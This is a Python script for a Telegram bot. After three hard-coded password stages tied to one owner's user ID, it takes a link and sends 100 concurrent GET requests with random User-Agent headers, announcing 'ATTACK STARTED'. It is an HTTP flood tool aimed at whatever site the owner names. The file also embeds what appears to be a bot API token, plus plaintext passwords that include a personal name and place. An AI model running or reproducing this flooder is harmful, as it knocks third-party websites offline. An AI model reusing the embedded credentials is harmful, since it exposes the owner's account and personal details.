import os, time, requests, threading, random

TOKEN = "8536346083:AAGYUDR6cd7hI9_41_gNbQdREbBb6Dn_9v4"
MASTER_ID = 1938591484

class SovereignMaster:
    def __init__(self, t):
        self.t, self.f, self.r, self.u = t, {}, False, f"https://api.telegram.org/bot{t}"
        self._s(MASTER_ID, "SYSTEM ONLINE")

    def _s(self, c, x):
        try: requests.post(f"{self.u}/sendMessage", json={'chat_id': c, 'text': x})
        except: pass

    def _boost(self, url):
        self._s(MASTER_ID, "ATTACK STARTED")
        for _ in range(100): 
            threading.Thread(target=lambda: requests.get(url, headers={'User-Agent': str(random.random())}), daemon=True).start()

    def listen(self):
        o = 0
        while True:
            try:
                res = requests.get(f"{self.u}/getUpdates?offset={o}&timeout=10").json()
                for u in res.get('result', []):
                    o = u['update_id'] + 1
                    m = u.get('message', {}); uid = m.get('from', {}).get('id'); tx = m.get('text', '')
                    if uid != MASTER_ID: continue
                    st = self.f.get(uid, 0)
                    if tx == "/start":
                        self._s(uid, "WELCOME MASTER. ENTER FIRST PASSWORD.")
                        self.f[uid] = 1
                    elif st == 1:
                        if "ariful islam pappu 2000" in tx.lower():
                            self._s(uid, "IDENTITY CONFIRMED. ENTER SECOND LOGIC.")
                            self.f[uid] = 2
                        else: self._s(uid, "WRONG PASSWORD.")
                    elif st == 2:
                        if "জামালপুর" in tx:
                            self._s(uid, "LEVEL 2 CLEARED. ENTER MASTER KEY.")
                            self.f[uid] = 3
                        else: self._s(uid, "INVALID DATA.")
                    elif st == 3:
                        if tx == "Aip2k3052":
                            self.f[uid] = "ROOT"; self.r = True
                            self._s(uid, "ACCESS GRANTED. SEND LINK.")
                        else: self._s(uid, "KEY ERROR.")
                    elif self.r and "http" in tx:
                        self._boost(tx)
            except: pass
            time.sleep(1)

if __name__ == "__main__":
    SovereignMaster(TOKEN).listen()
    
